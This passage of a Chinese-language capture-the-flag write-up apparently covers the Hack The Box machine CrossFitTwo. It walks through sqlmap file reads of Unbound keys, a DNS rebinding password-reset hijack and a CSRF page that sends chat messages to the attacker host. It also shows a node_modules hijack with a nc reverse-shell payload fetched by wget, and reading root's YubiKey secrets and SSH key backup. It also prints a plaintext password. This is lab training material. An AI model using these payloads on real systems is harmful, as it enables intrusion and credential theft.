\</span><br><span class="line">        | tr -d <span class="string">'"'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sign up</span></span><br><span class="line">cat - &lt;&lt;EOF &gt; signup.json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"username"</span>: <span class="string">"<span class="variable">$&#123;USER&#125;</span>"</span>,</span><br><span class="line">    <span class="string">"password"</span>: <span class="string">"<span class="variable">$&#123;PASS&#125;</span>"</span>,</span><br><span class="line">    <span class="string">"email"</span>   : <span class="string">"<span class="variable">$&#123;EMAIL&#125;</span>"</span>,</span><br><span class="line">    <span class="string">"confirm"</span> : <span class="string">"<span class="variable">$&#123;EMAIL&#125;</span>"</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">curl -s \</span><br><span class="line">     -b <span class="string">"<span class="variable">$&#123;COOKIE&#125;</span>"</span> \</span><br><span class="line">     -H <span class="string">"Content-Type: application/json"</span> \</span><br><span class="line">     -H <span class="string">"X-CSRF-TOKEN: <span class="variable">$&#123;TOKEN&#125;</span>"</span> \</span><br><span class="line">     -d <span class="string">"<span class="variable">$(cat signup.json | jq -c)</span>"</span> \</span><br><span class="line">     -x <span class="string">"<span class="variable">$&#123;PROXY&#125;</span>"</span> \</span><br><span class="line">     <span class="string">"http://<span class="variable">$&#123;RHOST&#125;</span>:<span class="variable">$&#123;RPORT&#125;</span>/api/signup"</span> | jq .</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean up</span></span><br><span class="line">rm -rf <span class="string">"<span class="variable">$&#123;COOKIE&#125;</span>"</span></span><br></pre></td></tr></table></figure>

<h1 id="Unbound"><a href="#Unbound" class="headerlink" title="Unbound"></a>Unbound</h1><p>注意前面还有个8953端口，这个是Unbound的control-port，而unbound-control需要server证书，客户端密钥，客户端证书几个文件，还是通过sql去读文件获取：</p>
<ul>
<li><a href="https://man.openbsd.org/unbound.conf" target="_blank" rel="noopener">https://man.openbsd.org/unbound.conf</a></li>
</ul>
<h2 id="var-unbound-etc-unbound-conf"><a href="#var-unbound-etc-unbound-conf" class="headerlink" title="/var/unbound/etc/unbound.conf"></a>/var/unbound/etc/unbound.conf</h2><p>首先读取配置文件，根据配置文件得到相关文件路径：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/var/unbound/etc/unbound.conf"</span><br><span class="line"></span><br><span class="line">server:</span><br><span class="line">        interface: 127.0.0.1</span><br><span class="line">        interface: ::1</span><br><span class="line">        access-control: 0.0.0.0/0 refuse</span><br><span class="line">        access-control: 127.0.0.0/8 allow</span><br><span class="line">        access-control: ::0/0 refuse</span><br><span class="line">        access-control: ::1 allow</span><br><span class="line">        hide-identity: yes</span><br><span class="line">        hide-version: yes</span><br><span class="line">        msg-cache-size: 0</span><br><span class="line">        rrset-cache-size: 0</span><br><span class="line">        cache-max-ttl: 0</span><br><span class="line">        cache-max-negative-ttl: 0</span><br><span class="line">        auto-trust-anchor-file: "/var/unbound/db/root.key"</span><br><span class="line">        val-log-level: 2</span><br><span class="line">        aggressive-nsec: yes</span><br><span class="line">        include: "/var/unbound/etc/conf.d/local_zones.conf"</span><br><span class="line"></span><br><span class="line">remote-control:</span><br><span class="line">        control-enable: yes</span><br><span class="line">        control-interface: 0.0.0.0</span><br><span class="line">        control-use-cert: yes</span><br><span class="line">        server-key-file: "/var/unbound/etc/tls/unbound_server.key"</span><br><span class="line">        server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"</span><br><span class="line">        control-key-file: "/var/unbound/etc/tls/unbound_control.key"</span><br><span class="line">        control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"</span><br></pre></td></tr></table></figure>

<h2 id="download-files"><a href="#download-files" class="headerlink" title="download files"></a>download files</h2><p>下载所需的几个文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/var/unbound/etc/tls/unbound_server.pem" </span><br><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/var/unbound/etc/tls/unbound_control.key"</span><br><span class="line">sqlmap -u http://10.211.55.12:7777/client.php\?id\=1 --batch --string='Good news!' --technique=B --threads=10  --file-read="/var/unbound/etc/tls/unbound_control.pem"</span><br></pre></td></tr></table></figure>

<p>如果嫌太慢就直接scp吧，这里直接给出来后面才能得到的密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp david@10.10.10.232:/var/unbound/etc/tls/unbound_server.pem unbound_server.pem</span><br><span class="line">scp david@10.10.10.232:/var/unbound/etc/tls/unbound_control.key unbound_control.key</span><br><span class="line">scp david@10.10.10.232:/var/unbound/etc/tls/unbound_control.pem unbound_control.pem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh david@10.10.10.232</span><br><span class="line">NWBFcSe3ws4VDhTB</span><br></pre></td></tr></table></figure>

<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>之后使用本地配置文件，测试remote control：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051116.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="crossfit-conf"><a href="#crossfit-conf" class="headerlink" title="crossfit.conf"></a>crossfit.conf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">remote-control:</span><br><span class="line">    server-cert-file: &quot;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_server.pem&quot;</span><br><span class="line">    control-key-file: &quot;&#x2F;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_control.key&quot;</span><br><span class="line">    control-cert-file: &quot;&#x2F;home&#x2F;miao&#x2F;Desktop&#x2F;HTB&#x2F;CrossFitTwo&#x2F;unbound_control.pem&quot;</span><br></pre></td></tr></table></figure>

<h1 id="密码重置-amp-dns-rebind"><a href="#密码重置-amp-dns-rebind" class="headerlink" title="密码重置 &amp; dns rebind"></a>密码重置 &amp; dns rebind</h1><p>根据前面relayd配置文件，可以知道配置的是<code>*employees.crossfit.htb</code>, 那么我们如果在前面添加其他字符，并且控制对应dns，那么就可能劫持密码重置链接</p>
<h2 id="add-forward"><a href="#add-forward" class="headerlink" title="add_forward"></a>add_forward</h2><p>unbound添加一条规则，将dns请求转发到我们的dns服务器：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.14</span><br></pre></td></tr></table></figure>

<h2 id="dnschef"><a href="#dnschef" class="headerlink" title="dnschef"></a>dnschef</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.14</span><br></pre></td></tr></table></figure>

<p>直接这样得到响应，只允许localhost：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051117.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051118.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p> 修改为127.0.0.1可以发送成功，但我们得不到请求：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051119.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051120.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="dns-rebinding"><a href="#dns-rebinding" class="headerlink" title="dns rebinding"></a>dns rebinding</h2><p>所以这里就是dns rebinding,通过dns rebinding得到重置密码链接格式：</p>
<p>两次dns以及请求速度要快：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1</span><br><span class="line">sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.14</span><br><span class="line"></span><br><span class="line">GET &#x2F;password-reset.php?token&#x3D;xxx</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051121.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><a href="http://crossfit-club.htb是vue" target="_blank" rel="noopener">http://crossfit-club.htb是vue</a> js，逆向调试发现Socket.IO，因为有dns rebinding，我们可以控制响应，我们可以将password-reset.php重定向到我们的包含socket.io-client.js的页面，然后响应XMLHttpRequest到nc</p>
<p>Unbound-control添加对应forward规则，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.14</span><br><span class="line">unbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i miao.moe 10.10.14.14</span><br><span class="line"></span><br><span class="line">sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1</span><br><span class="line">sudo python3 dnschef.py -i 10.10.14.14 --fakedomains xemployees.crossfit.htb,miao.moe --fakeip 10.10.14.14</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051122.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051123.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>会收到很多不同的消息，其中有一条是密码相关的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051124.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;sender_id&quot;:2,&quot;content&quot;:&quot;Hello David, I&#39;ve added a user account for you with the password &#96;NWBFcSe3ws4VDhTB&#96;.&quot;,&quot;roomId&quot;:2,&quot;_id&quot;:1118&#125;</span><br></pre></td></tr></table></figure>



<h2 id="password-reset-php"><a href="#password-reset-php" class="headerlink" title="password-reset.php"></a>password-reset.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Location: http://miao.moe/x.html"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="x-html"><a href="#x-html" class="headerlink" title="x.html"></a>x.html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://crossfit-club.htb/socket.io/socket.io.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> socket = io(<span class="string">"http://crossfit-club.htb"</span>);</span></span><br><span class="line"><span class="actionscript">        socket.emit(<span class="string">"user_join"</span>, &#123; username : <span class="string">"administrator"</span> &#125;);</span></span><br><span class="line"><span class="actionscript">        socket.on(<span class="string">"private_recv"</span>, (data) =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">            xhr.open(<span class="string">"GET"</span>, <span class="string">"http://10.10.14.14:8000/?x="</span> + <span class="built_in">JSON</span>.stringify(data), <span class="literal">true</span>);</span></span><br><span class="line"><span class="undefined">            xhr.send();</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的密码就是david ssh密码，登录得到user.txt:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh david@10.10.10.232</span><br><span class="line">NWBFcSe3ws4VDhTB</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051125.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>简单的枚举发现david和john都在sysadmins组，而root和john都在staff组，所以应该是要通过John：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051201.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="david-to-john"><a href="#david-to-john" class="headerlink" title="david to john"></a>david to john</h1><p>默认是csh，切到/bin/sh后进行枚举：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -group sysadmins -ls 2&gt;/dev/null</span><br><span class="line">1244170    4 drwxrwxr-x    3 root     sysadmins      512 Feb  3 04:45 /opt/sysadmin</span><br></pre></td></tr></table></figure>

<p>发现一个statbot.js文件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051202.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>这个脚本是john用户定时运行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">crossfit2$</span><span class="bash"> ls -al /tmp/chatbot.log</span></span><br><span class="line">-rw-r--r--  1 john  wheel  30982 May 12 06:39 /tmp/chatbot.log</span><br></pre></td></tr></table></figure>

<h2 id="node-modules搜索路径劫持"><a href="#node-modules搜索路径劫持" class="headerlink" title="node_modules搜索路径劫持"></a>node_modules搜索路径劫持</h2><p>写log应该是用的log-to-file模块，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -name 'log-to-file' -ls 2&gt;/dev/null</span><br><span class="line">1845012    4 drwxr-xr-x    2 root     wheel         512 Jan 13 10:44 /usr/local/lib/node_modules/log-to-file</span><br></pre></td></tr></table></figure>

<p>根据nodejs 文档：</p>
<ul>
<li><a href="https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders" target="_blank" rel="noopener">https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders</a></li>
</ul>
<p>我们可以在/opt/sysadmins写文件，如果在里面创建node_modules，优先级会比系统的module路径高</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051203.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>等待log执行，得到John shell：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051204.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="statbot-js"><a href="#statbot-js" class="headerlink" title="statbot.js"></a>statbot.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> WebSocket = <span class="built_in">require</span>(<span class="string">'ws'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="built_in">require</span>(<span class="string">'log-to-file'</span>);</span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://gym.crossfit.htb/ws/"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">status, connect</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message;</span><br><span class="line">  <span class="keyword">if</span>(status) &#123;</span><br><span class="line">    message = <span class="string">`Bot is alive`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(connect) &#123;</span><br><span class="line">      message = <span class="string">`Bot is down (failed to connect)`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      message = <span class="string">`Bot is down (failed to receive)`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  logger(message, <span class="string">'/tmp/chatbot.log'</span>);</span><br><span class="line">&#125;</span><br><span class="line">ws.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ws.close();</span><br><span class="line">  log(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;)</span><br><span class="line">ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> <span class="title">message</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  data = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(data.status === <span class="string">"200"</span>) &#123;</span><br><span class="line">      ws.close()</span><br><span class="line">      log(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">      ws.close()</span><br><span class="line">      log(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">"child_process"</span>);</span><br><span class="line"></span><br><span class="line">exec(<span class="string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.14 4444 &gt;/tmp/f"</span>, (error, stdout, stderr) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Export.</span></span><br><span class="line"><span class="built_in">module</span>.exports = logToFile;</span><br></pre></td></tr></table></figure>

<h2 id="exploit-sh"><a href="#exploit-sh" class="headerlink" title="exploit.sh"></a>exploit.sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir -p /opt/sysadmin/node_modules</span><br><span class="line">cp -r /usr/<span class="built_in">local</span>/lib/node_modules/<span class="built_in">log</span>-to-file /opt/sysadmin/node_modules/</span><br><span class="line">rm /opt/sysadmin/node_modules/<span class="built_in">log</span>-to-file/app.js</span><br><span class="line">wget -q -O/opt/sysadmin/node_modules/<span class="built_in">log</span>-to-file/app.js 10.10.14.14:7777/app.js</span><br></pre></td></tr></table></figure>

<h1 id="john-to-root"><a href="#john-to-root" class="headerlink" title="john to root"></a>john to root</h1><h2 id="suid-log"><a href="#suid-log" class="headerlink" title="suid log"></a>suid log</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -group staff -ls 2&gt;/dev/null</span><br><span class="line">1481580   20 -rwsr-s---    1 root     staff        9024 Jan  5 13:04 /usr/local/bin/log</span><br></pre></td></tr></table></figure>

<p>这个log是用于读文件的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051205.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="yubikey"><a href="#yubikey" class="headerlink" title="yubikey"></a>yubikey</h2><p>前面看到root登录和yubikey有关：</p>
<ul>
<li><a href="https://man.openbsd.org/man8/login_yubikey.8" target="_blank" rel="noopener">https://man.openbsd.org/man8/login_yubikey.8</a></li>
</ul>
<p>所以可以读yubikey相关文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log /var/db/yubikey/root.key &amp;&amp; log /var/db/yubikey/root.uid &amp;&amp; log /var/db/yubikey/root.ctr &amp;&amp; echo</span><br><span class="line"></span><br><span class="line">6bf9a26475388ce998988b67eaa2ea87</span><br><span class="line"></span><br><span class="line">a4ce1128bde4</span><br><span class="line"></span><br><span class="line">985089 # 转成hex是0xf0801,最后的01是计数器，用到的是0f08</span><br></pre></td></tr></table></figure>

<p>根据这些，可以使用yubico生成OTP：</p>
<ul>
<li><a href="https://github.com/Yubico/yubico-c" target="_blank" rel="noopener">https://github.com/Yubico/yubico-c</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08  c0a8 00 02</span><br></pre></td></tr></table></figure>

<h2 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h2><p>查看change list，发现/root/.ssh/id_rsa，根据文档，存在备份：</p>
<ul>
<li><a href="https://man.openbsd.org/changelist" target="_blank" rel="noopener">https://man.openbsd.org/changelist</a></li>
</ul>
<p>默认备份路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;backups&#x2F;root_.ssh_id_rsa.current</span><br></pre></td></tr></table></figure>

<p>然后log去读取，得到ssh私钥：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051206.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="etc-changelist"><a href="#etc-changelist" class="headerlink" title="/etc/changelist"></a>/etc/changelist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 